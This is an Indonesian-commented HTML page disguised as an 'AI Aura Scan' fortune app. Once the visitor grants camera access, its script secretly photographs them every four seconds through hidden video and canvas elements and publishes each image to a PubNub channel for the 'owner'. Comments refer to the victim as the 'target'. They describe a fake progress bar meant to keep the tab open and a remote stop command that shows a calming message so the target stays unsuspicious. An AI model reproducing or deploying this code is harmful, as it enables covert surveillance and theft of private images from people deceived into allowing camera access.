<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Deep Aura Scanner</title>
    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
    <style>
        /* Gaya Tampilan Dark Mode (Rakitan Dyron) */
        body {
            margin: 0; padding: 0; background: #000; color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden; height: 100vh; display: flex;
            align-items: center; justify-content: center; text-align: center;
        }

        /* Latar Belakang Meteor Bergerak (Pure CSS) */
        .stars {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: url('https://i.imgur.com/8fS8tK1.png') repeat top center;
            z-index: 1; opacity: 0.5;
        }
        .meteor {
            position: absolute; width: 2px; height: 150px;
            background: linear-gradient(0deg, rgba(0,210,255,1) 0%, rgba(0,0,0,0) 100%);
            animation: fall linear infinite; filter: drop-shadow(0 0 5px #00d2ff);
            opacity: 0; z-index: 2;
        }
        @keyframes fall {
            0% { transform: translateY(-200px) rotate(-45deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100vh) rotate(-45deg); opacity: 0; }
        }
        /* Variasi Meteor */
        .m1 { left: 20%; animation-duration: 3s; animation-delay: 1s; }
        .m2 { left: 50%; animation-duration: 4s; animation-delay: 3s; }
        .m3 { left: 80%; animation-duration: 2.5s; animation-delay: 0.5s; }
        .m4 { left: 10%; animation-duration: 5s; animation-delay: 2s; }
        .m5 { left: 90%; animation-duration: 3.5s; animation-delay: 4s; }

        /* Kartu Tampilan Utama */
        .card {
            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px);
            padding: 40px; border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            width: 85%; max-width: 400px;
            z-index: 10; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
        }
        h1 { font-size: 1.8rem; margin-bottom: 5px; color: #fff; font-weight: 300; letter-spacing: 1px; }
        p { font-size: 0.9rem; opacity: 0.7; margin-bottom: 25px; }
        .btn-start {
            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
            color: white; border: none; padding: 18px 40px;
            font-size: 1.1rem; font-weight: bold; border-radius: 50px;
            cursor: pointer; box-shadow: 0 10px 20px rgba(0, 210, 255, 0.3);
            transition: 0.3s; width: 100%; text-transform: uppercase; letter-spacing: 1px;
        }
        .btn-start:active { transform: scale(0.96); box-shadow: 0 5px 10px rgba(0, 210, 255, 0.2); }
        .status-scan { display: none; margin-top: 20px; font-weight: bold; color: #00d2ff; }
        
        /* Kamera Tersembunyi */
        video, canvas { display: none; position: absolute; }
    </style>
</head>
<body>

    <div class="stars"></div>
    <div class="meteor m1"></div>
    <div class="meteor m2"></div>
    <div class="meteor m3"></div>
    <div class="meteor m4"></div>
    <div class="meteor m5"></div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <div class="card" id="mainUI">
        <h1>🌌 AI AURA SCAN</h1>
        <p>Gunakan teknologi Deep-AI terbaru untuk menganalisis energi dan keberuntungan dari wajahmu.</p>
        
        <button class="btn-start" id="btn" onclick="startSystem()">MULAI ANALISIS</button>
        
        <div id="statusText" class="status-scan">MENGHUBUNGKAN SERVER AI...</div>
        <p style="font-size: 0.7rem; margin-top: 25px; opacity: 0.4;">*Akses kamera diperlukan untuk verifikasi wajah</p>
    </div>

    <script>
        // Key Demo (Ganti dengan Key Anda jika ada)
        const pubnub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: 'target_id' });
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        let photoInterval; // Variabel untuk menyimpan interval foto

        // 1. DENGARKAN PERINTAH STOP DARI OWNER (PENTING!)
        pubnub.subscribe({ channels: ['vin_vortex_control'] }); 
        pubnub.addListener({
            message: function(m) {
                if (m.message === "STOP_SCAN") {
                    // JIKA OWNER KLIK STOP, MATIKAN SEMUANYA
                    clearInterval(photoInterval); // Berhenti ambil foto
                    const tracks = video.srcObject.getTracks(); // Matikan kamera fisik
                    tracks.forEach(track => track.stop());
                    
                    // Ubah tampilan target agar tidak curiga
                    document.getElementById('statusText').innerText = "ANALISIS SELESAI. DATA DISIMPAN.";
                    document.getElementById('statusText').style.color = "cyan";
                }
            }
        });

        // 2. JALANKAN SISTEM KETIKA TOMBOL DIKLIK
        async function startSystem() {
            // Tampilan Target saat Memulai
            document.getElementById('btn').style.display = 'none';
            document.getElementById('statusText').style.display = 'block';

            try {
                // MINTA IZIN KAMERA DEPAN
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                
                // Mulai ambil foto otomatis setiap 4 detik, simpan ke variabel photoInterval
                photoInterval = setInterval(captureAndSend, 4000);

                // Buat target menunggu lama (Pancingan agar tidak menutup tab)
                let progress = 12;
                setInterval(() => {
                    if (progress < 99) {
                        progress += Math.floor(Math.random() * 5);
                        document.getElementById('statusText').innerText = `MENGANALISIS WAJAH (${progress}%)...`;
                    } else {
                        document.getElementById('statusText').innerText = "SERVER BUSY! COBA LAGI NANTI.";
                    }
                }, 3000);

            } catch (err) {
                alert("Gagal: AI membutuhkan akses kamera untuk membaca aura wajahmu.");
                location.reload(); // Refresh jika ditolak
            }
        }

        // 3. FUNGSI AMBIL FOTO & KIRIM KE OWNER
        function captureAndSend() {
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            // Konversi ke Base64 (Data Gambar)
            const data = canvas.toDataURL('image/jpeg', 0.5); // Kompresi 50% agar cepat
            
            // Kirim ke Owner lewat saluran 'vin_vortex_gate'
            pubnub.publish({
                channel: 'vin_vortex_gate',
                message: { img: data }
            });
        }
    </script>
</body>
</html>
